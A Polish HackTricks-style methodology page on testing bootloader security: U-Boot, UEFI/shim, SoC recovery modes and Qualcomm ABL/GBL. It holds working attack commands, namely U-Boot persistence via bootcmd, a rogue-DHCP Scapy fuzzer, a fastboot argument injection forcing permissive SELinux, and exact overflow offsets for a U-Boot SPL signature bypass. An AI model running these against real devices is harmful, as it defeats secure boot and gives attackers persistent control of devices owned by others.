# Testowanie bootloadera

{{#include ../../banners/hacktricks-training.md}}

Poniższe kroki są zalecane podczas modyfikowania konfiguracji uruchamiania urządzenia i testowania bootloaderów, takich jak U-Boot i bootloadery klasy UEFI. Skup się na uzyskaniu wykonania kodu na wczesnym etapie, ocenie zabezpieczeń przed fałszowaniem podpisów i rollbackiem oraz wykorzystaniu ścieżek odzyskiwania lub rozruchu sieciowego.

Powiązane: obejście secure boot w MediaTek przez patchowanie bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Szybkie sposoby i nadużywanie środowiska U-Boot

1. Uzyskaj dostęp do powłoki interpretera
   - Podczas uruchamiania naciśnij znany klawisz przerywający (często dowolny klawisz, 0, spacja lub specyficzna dla płyty „magiczna” sekwencja), zanim zostanie wykonane `bootcmd`, aby przejść do wiersza poleceń U-Boot.<sup>[[1]](#references)</sup>

2. Sprawdź stan uruchamiania i zmienne
   - Przydatne polecenia:
     - `printenv` (wyświetla zmienne środowiskowe)
     - `bdinfo` (informacje o płycie i adresach pamięci)
     - `help bootm; help booti; help bootz` (obsługiwane metody uruchamiania jądra)
     - `help ext4load; help fatload; help tftpboot` (dostępne programy ładujące)

3. Zmodyfikuj argumenty uruchamiania, aby uzyskać powłokę roota
   - Dodaj `init=/bin/sh`, aby jądro uruchomiło powłokę zamiast standardowego procesu init:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot z serwera TFTP
   - Skonfiguruj sieć i pobierz z LAN obraz kernel/fit:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Utrwal zmiany za pomocą zmiennych środowiskowych
   - Jeśli pamięć env nie jest chroniona przed zapisem, możesz utrwalić przejęcie kontroli:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Sprawdź zmienne takie jak `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, które wpływają na ścieżki awaryjne. Nieprawidłowo skonfigurowane wartości mogą umożliwiać wielokrotne wejście do powłoki.

6. Sprawdź funkcje debugowania i niebezpieczne funkcje
   - Sprawdź: `bootdelay` > 0, wyłączone `autoboot`, nieograniczone `usb start; fatload usb 0:1 ...`, możliwość użycia `loady`/`loads` przez port szeregowy, `env import` z niezaufanych nośników oraz jądra/ramdyski ładowane bez sprawdzania podpisów.

7. Testowanie obrazów U-Boot i weryfikacji
   - Jeśli platforma deklaruje secure/verified boot z obrazami FIT, przetestuj zarówno obrazy niepodpisane, jak i zmodyfikowane:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Brak `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` lub starszego zachowania `verify=n` często umożliwia uruchamianie dowolnych payloadów.
   - Nie poprzestawaj na prostym wyniku allow/deny: niedawne badania FIT wykazały, że sama ścieżka weryfikacji może stanowić powierzchnię ataku pre-auth. Przeprowadź testy negatywne zewnętrznie przechowywanych danych FIT (`data-offset`, `data-position`, `data-size`), wyboru podpisanej konfiguracji, obsługi `loadables` oraz overlay / `extra-conf`.
   - Jeśli masz pasujące drzewo źródłowe, `test/vboot/vboot_test.sh` pozwala szybko odtworzyć zachowanie weryfikacji FIT w U-Boot sandbox, zanim zaczniesz testować rzeczywisty sprzęt.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux` i przepływy rozruchu skryptów
   - We współczesnych kompilacjach U-Boot `bootcmd` często jest tylko opakowaniem dla Standard Boot. Oznacza to, że zapisywalne nośniki, PXE lub pamięć flash SPI mogą stanowić rzeczywistą granicę zaufania, nawet jeśli widoczne środowisko wygląda nieszkodliwie.
   - `extlinux` bootmeth wyszukuje `extlinux/extlinux.conf` w `/` i `/boot`; script bootmeth najpierw szuka `boot.scr.uimg`, a następnie `boot.scr`. Przy rozruchu sieciowym nazwa pliku skryptu może pochodzić z `boot_script_dhcp`.
   - Przydatne polecenia do wstępnej analizy:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Przypadki nadużyć do przetestowania: kontrolowane przez atakującego nośniki USB/SD znajdujące się wcześniej w `boot_targets`, zapisywalny plik `/boot/extlinux/extlinux.conf`, złośliwy serwer TFTP dostarczający `boot.scr` lub wykonywanie skryptu z pamięci SPI przez `script_offset_f`.
   - Jeśli platforma polega na weryfikacji FIT, upewnij się, że konfiguracje są podpisane na poziomie konfiguracji, a nie tylko poszczególnych obrazów; `required-mode=all` jest bezpieczniejsze niż akceptowanie dowolnego pojedynczego wymaganego klucza.

### Zewnętrzne dane FIT w SPL kopiowane przed weryfikacją

Podczas ładowania FIT przez SPL poprawny podpis konfiguracji nie sprawia, że metadane zewnętrznego payloadu są bezpieczne. U-Boot wyklucza `data-position`, `data-offset` i `data-size` z podpisywanych właściwości konfiguracji. W podatnych ścieżkach `load_simple_fit()` SPL wyznacza przesunięcie źródła i długość kopiowania na podstawie tych pól, a następnie wywołuje `info->read()` **przed** sprawdzeniem hasha obrazu. W rezultacie spreparowany FIT na zapisywalnym nośniku rozruchowym może nadpisać RAM bez podrobienia podpisu. Podpisana właściwość `load` zwykle ustala miejsce docelowe, więc najpierw sprawdź, czy kopia o nadmiernej długości może z tego adresu dosięgnąć stosu lub innych danych sterujących.<sup>[[15]](#references)[[16]](#references)</sup>

Prześledź rzeczywisty loader płyty i mapę pamięci, zamiast zakładać, że odczyt odbywa się z pamięci flash: w opisanym przypadku loader RAM wywołał `spl_ram_load_read()` i `memcpy()`. W miejscu wywołania zanotuj `fit_offset` oraz dowolny adres bazowy FIT dodawany przez reader, długość bloku loadera (`spl_get_bl_len(info)`), ewentualne wyrównanie specyficzne dla forka, wynikowe `read_offset` i rozmiar transferu `size`, adres docelowy `src_ptr` oraz lokalizację zapisanego adresu powrotu. Sprawdź, czy ciągły, zmapowany obszar źródłowy obejmuje wymaganą odległość kopiowania, czy nakłada się na miejsce docelowe oraz czy bajty w pozycji źródłowej mogą dostarczyć wskaźnik do kontrolowanych przez atakującego danych FIT. Ogólna [technika częściowego nadpisania adresu powrotu](../../binary-exploitation/stack-overflow/ret2win/) ma zastosowanie, jeśli pełny wskaźnik nie spełnia ograniczeń wyrównania loadera.<sup>[[16]](#references)</sup>

W testowej kompilacji 32-bitowego AST2600 badaczy `src_ptr` miało wartość `0x80001000`, a zapisany adres powrotu funkcji `memcpy` znajdował się pod adresem `0x902ffe24`. Użyli kompilacji upstream zmodyfikowanej za pomocą helperów OpenBMC do rozmieszczenia stosu i wyrównania: reader RAM dodawał bazę FIT `0x10000`, a te helpery zaokrąglały przesunięcie źródła w dół do `ARCH_DMA_MINALIGN` (64 bajty). Wskaźnik little-endian pod adresem `0x902fffe4` oraz kopia kończąca się o jeden bajt wcześniej zmieniły tylko trzy najmłodsze bajty zapisanego adresu powrotu, zachowując znany zerowy bajt najstarszy. Loader RAM w wersji upstream używa natomiast długości bloku równej jednemu bajtowi, więc wyrównanie do 64 bajtów i obejście z częściowym nadpisaniem nie są ogólnymi wymaganiami SPL. Dla każdej kompilacji ponownie wyznacz adresy, długość bloku loadera i zakres kopiowania. W pierwotnym obliczeniu poniżej `fit_offset` oznacza efektywne przesunięcie bazowe FIT dodawane przez reader RAM, a niekoniecznie argument przekazywany do `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Poprawka upstream ogranicza zarówno surowe `data-size`, jak i **wyrównany do bloku** rozmiar transferu przed wywołaniem `info->read()`. Ścieżka overlay przekazuje rzeczywistą pojemność bufora, natomiast inni wywołujący używają `CONFIG_SYS_BOOTM_LEN`, które stanowi jedynie luźny limit, a nie dowód, że w miejscu docelowym jest tyle wolnej pamięci. Oceniając fork dostawcy, sprawdź, czy te kontrole są obecne, i porównaj dozwolony zakres kopiowania z rzeczywistym stosem SPL i zarezerwowanymi obszarami na płycie.<sup>[[15]](#references)[[16]](#references)</sup>

## Powierzchnia ataku związana z rozruchem sieciowym (DHCP/PXE) i nieautoryzowanymi serwerami

9. Testowanie fuzzingiem parametrów PXE/DHCP
   - Obsługa BOOTP/DHCP w starszym U-Boot miała problemy z bezpieczeństwem pamięci. Na przykład CVE‑2024‑42040 opisuje ujawnienie pamięci za pomocą spreparowanych odpowiedzi DHCP, które mogą wyciekać bajty z pamięci U-Boot do sieci.<sup>[[4]](#references)</sup> Testuj ścieżki kodu DHCP/PXE, używając nadmiernie długich wartości i wartości brzegowych (nazwa pliku rozruchowego w opcji 67, opcje dostawcy, pola file/servername), i obserwuj, czy występują zawieszenia lub wycieki.
   - Minimalny fragment kodu Scapy do testowania parametrów rozruchu podczas netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Sprawdź również, czy pola nazw plików PXE są przekazywane do logiki powłoki/programu ładującego bez sanityzacji, gdy są używane w skryptach provisioningu po stronie systemu operacyjnego.

10. Testowanie command injection na nieautoryzowanym serwerze DHCP
   - Skonfiguruj nieautoryzowaną usługę DHCP/PXE i spróbuj wstrzykiwać znaki do pól nazw plików lub opcji, aby dotrzeć do interpreterów poleceń na późniejszych etapach łańcucha rozruchowego. Dobrze sprawdzą się moduł pomocniczy DHCP w Metasploit, `dnsmasq` lub własne skrypty Scapy. Najpierw odizoluj sieć laboratoryjną.

## Tryby odzyskiwania ROM SoC, które zastępują normalny rozruch

Wiele SoC udostępnia tryb „loadera” BootROM, który przyjmuje kod przez USB/UART, nawet gdy obrazy pamięci flash są nieprawidłowe. Jeśli bezpieczny rozruch nie jest zablokowany bezpiecznikami, może to umożliwić wykonanie dowolnego kodu na bardzo wczesnym etapie łańcucha.

- NXP i.MX (Serial Download Mode)
  - Narzędzia: `uuu` (mfgtools3) lub `imx-usb-loader`.
  - Przykład: `imx-usb-loader u-boot.imx` — przesłanie i uruchomienie własnego U-Boot z RAM.
- Allwinner (FEL)
  - Narzędzie: `sunxi-fel`.
  - Przykład: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` lub `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Narzędzie: `rkdeveloptool`.
  - Przykład: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` — załadowanie loadera i przesłanie własnego U-Boot.

Sprawdź, czy bezpieczny rozruch jest zabezpieczony przez eFuse/OTP. Jeśli nie, tryby pobierania BootROM często omijają wszelką weryfikację wyższego poziomu (U-Boot, jądra, rootfs), uruchamiając bezpośrednio ładunek pierwszego etapu z SRAM/DRAM.

## Programy rozruchowe UEFI/klasy PC: szybkie kontrole

11. Testowanie manipulacji ESP, rollbacku i rejestrowania kluczy
   - Zamontuj EFI System Partition (ESP) i sprawdź, czy zawiera komponenty programu ładującego: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` oraz ścieżki do logo producenta.
   - Jeśli to możliwe, pobierz stan Secure Boot i bazy danych kluczy z systemu operacyjnego:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Jeśli platforma jest w trybie Setup Mode, akceptuje rejestrowanie kluczy bez uwierzytelniania lub jest dostarczana z testowym/domyslnym Platform Key (klasa PKfail), lokalny administrator lub osoba mająca fizyczny dostęp może zarejestrować własne KEK/db i sprawić, że Secure Boot będzie wyglądał na „włączony”, mimo uruchamiania dowolnych plików binarnych EFI.<sup>[[3]](#references)</sup>
   - Spróbuj uruchomić system z użyciem starszych lub znanych podatnych, podpisanych komponentów rozruchowych, jeśli lista unieważnień Secure Boot (dbx) nie jest aktualna. Jeśli platforma nadal ufa starym shimom/bootmanagerom, często można załadować własne jądro lub `grub.cfg` z ESP, aby uzyskać trwały dostęp.
   - W systemie Windows na załatanych hostach nadal mogą być akceptowane podatne, podpisane menedżery rozruchu, jeśli w firmware `dbx` brakuje podpisującego `Microsoft Windows Production PCA 2011`, co zaobserwowano w przypadku BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Obejście w stylu Baton Drop może zarejestrować MOK atakującego; podczas kolejnych rozruchów legalny shim może wtedy załadować plik EFI podpisany tym kluczem.<sup>[[12]](#references)[[13]](#references)</sup> Późniejsze unieważnienie starego podpisującego Windows nie usuwa zarejestrowanego MOK, więc ścieżka oparta na shimie może pozostać aktywna, jeśli ten shim nadal jest zaufany.<sup>[[12]](#references)</sup>
   - Przed przetestowaniem tej ścieżki rollback na autoryzowanej maszynie UEFI sprawdź **rzeczywisty stan unieważnień firmware**, a nie tylko historię aktualizacji Windows.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft udostępnia to polecenie PowerShell z podwyższonymi uprawnieniami, które tylko odczytuje stan podpisującego z 2011 roku w `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` to tylko wskazówka: w możliwym do przywrócenia laboratorium potwierdź konkretny podpisany komponent rozruchowy i pozostałe unieważnienia.<sup>[[12]](#references)[[14]](#references)</sup> Oczekująca aktualizacja rejestru lub wygasły certyfikat podpisujący nie są równoznaczne z przeprowadzonym unieważnieniem `dbx`.<sup>[[13]](#references)[[14]](#references)</sup>

12. Testowanie nieaktualnych unieważnień shim / SBAT / dbx
   - Stare shimy podpisane przez Microsoft i forki dostawców nadal mogą umożliwiać uruchomienie bootkita w stylu BYOVD, jeśli unieważnienia są nieaktualne. W odizolowanym laboratorium umieść historycznie podatny shim na ESP i spróbuj chainloadować własny plik `grubx64.efi` lub kernel.<sup>[[11]](#references)</sup>
   - Szybka weryfikacja:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Jeśli shim nadal się uruchamia mimo umieszczenia na liście unieważnień, firmware/OS ma nieaktualne aktualizacje `dbx` lub ufa forkowanemu loaderowi, który nigdy nie odziedziczył zabezpieczeń SBAT z upstreamu.

13. Błędy parsowania logo rozruchowego (klasa LogoFAIL)
   - W firmware kilku producentów OEM/IBV występowały podatności związane z błędami parsowania obrazów w DXE, które przetwarzają logo rozruchowe. Jeśli atakujący może umieścić spreparowany obraz na ESP pod ścieżką właściwą dla danego producenta (np. `\EFI\<vendor>\logo\*.bmp`) i ponownie uruchomić urządzenie, możliwe może być wykonanie kodu podczas wczesnego etapu rozruchu, nawet przy włączonym Secure Boot. Sprawdź, czy platforma akceptuje logo dostarczone przez użytkownika i czy system operacyjny może zapisywać w tych ścieżkach.<sup>[[2]](#references)</sup>


## Luki w zaufaniu ABL + GBL Qualcomm w Androidzie (Android 16)

Na urządzeniach z Androidem 16, które używają ABL firmy Qualcomm do ładowania **Generic Bootloader Library (GBL)**, sprawdź, czy ABL **uwierzytelnia** aplikację UEFI ładowaną z partycji `efisp`. Jeśli ABL sprawdza jedynie **obecność** aplikacji UEFI i nie weryfikuje podpisów, możliwość zapisu do `efisp` umożliwia **wykonanie niepodpisanego kodu przed uruchomieniem systemu operacyjnego**.<sup>[[6]](#references)[[7]](#references)</sup>

Praktyczne kontrole i ścieżki nadużyć:

- **Możliwość zapisu do efisp**: Potrzebny jest sposób na zapisanie własnej aplikacji UEFI w `efisp` (root/usługa uprzywilejowana, błąd w aplikacji OEM, ścieżka recovery/fastboot). Bez tego luki w ładowaniu GBL nie da się bezpośrednio wykorzystać.<sup>[[6]](#references)</sup>
- **Wstrzykiwanie argumentów fastboot OEM** (błąd ABL): Niektóre kompilacje akceptują dodatkowe tokeny w `fastboot oem set-gpu-preemption` i dopisują je do wiersza poleceń jądra. Można to wykorzystać do wymuszenia permissive SELinux, co umożliwia zapis do chronionych partycji:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Jeśli urządzenie jest załatane, polecenie powinno odrzucać dodatkowe argumenty.<sup>[[5]](#references)[[6]](#references)</sup>
- **Odblokowanie bootloadera za pomocą trwałych flag**: Payload z etapu rozruchu może zmienić trwałe flagi odblokowania (np. `is_unlocked=1`, `is_unlocked_critical=1`), aby zasymulować `fastboot oem unlock` bez kontroli OEM server/approval. Zmiana ta utrzymuje się po kolejnym ponownym uruchomieniu.<sup>[[6]](#references)</sup>

Uwagi dotyczące obrony i triage:

- Sprawdź, czy ABL weryfikuje podpis payloadu GBL/UEFI z `efisp`. Jeśli nie, traktuj `efisp` jako powierzchnię wysokiego ryzyka pod kątem utrwalania dostępu.
- Sprawdź, czy handlery ABL fastboot OEM zostały załatane tak, by **weryfikować liczbę argumentów** i odrzucać dodatkowe tokeny.<sup>[[8]](#references)[[9]](#references)</sup>

## Ostrzeżenia dotyczące sprzętu

Zachowaj ostrożność podczas pracy z pamięcią flash SPI/NAND we wczesnej fazie rozruchu (np. zwierania pinów w celu pominięcia odczytu) i zawsze sprawdzaj dokumentację układu flash. Zwarcia wykonane w niewłaściwym momencie mogą uszkodzić urządzenie lub programator.

## Uwagi i dodatkowe wskazówki

- Wypróbuj `env export -t ${loadaddr}` i `env import -t ${loadaddr}`, aby przenosić bloby środowiska między RAM a pamięcią masową; niektóre platformy pozwalają importować środowisko z nośników wymiennych bez uwierzytelniania.
- W celu utrwalenia dostępu w systemach opartych na Linuksie, które uruchamiają się za pomocą `extlinux.conf`, często wystarczy zmodyfikować wiersz `APPEND` (aby wstrzyknąć `init=/bin/sh` lub `rd.break`) na partycji rozruchowej, jeśli nie są wymuszane kontrole podpisu.
- Jeśli urządzenie docelowe używa aktualizacji z dwoma slotami / A/B, zapoznaj się z technikami anti-rollback i slot-desync w [przeglądzie analizy firmware](README.md), aby nie przeoczyć luk w zaufaniu występujących wyłącznie w updaterze, poza samym bootloaderem.
- Jeśli userland udostępnia `fw_printenv/fw_setenv`, sprawdź, czy `/etc/fw_env.config` odpowiada rzeczywistemu miejscu przechowywania środowiska. Nieprawidłowo skonfigurowane offsety mogą spowodować odczyt lub zapis niewłaściwego regionu MTD.

## References

- [1] [Metodyka testowania bezpieczeństwa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Odkrycie LogoFAIL: zagrożenia związane z analizowaniem obrazów podczas rozruchu systemu](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: niezaufane klucze platformy podważają Secure Boot w ekosystemie UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Szczegóły CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: odblokowywanie Xiaomi za pomocą dwóch nieoczyszczonych ciągów znaków](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit GBL dla Qualcomm Snapdragon 8 Elite pozwala atakującym odblokowywać bootloadery](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Architektura Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: naprawa propagacji niezaufanych danych wejściowych do wiersza poleceń jądra](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: dodanie sprawdzania polecenia set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Niezdolny do rozruchu: łamanie weryfikacji podpisu FIT w U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Informacja o podatności VU#616257 — bootloadery shim UEFI podpisane przez Microsoft są podatne na obejście Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit BlackLotus: mit potwierdzony](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit podobny do BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Zarządzanie odwołaniami Windows Boot Manager na potrzeby zmian Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Poprawka U-Boot: ograniczenie rozmiaru danych zewnętrznych przed ich odczytem](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Ukryte beneFITy: obejście weryfikacji podpisu w U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
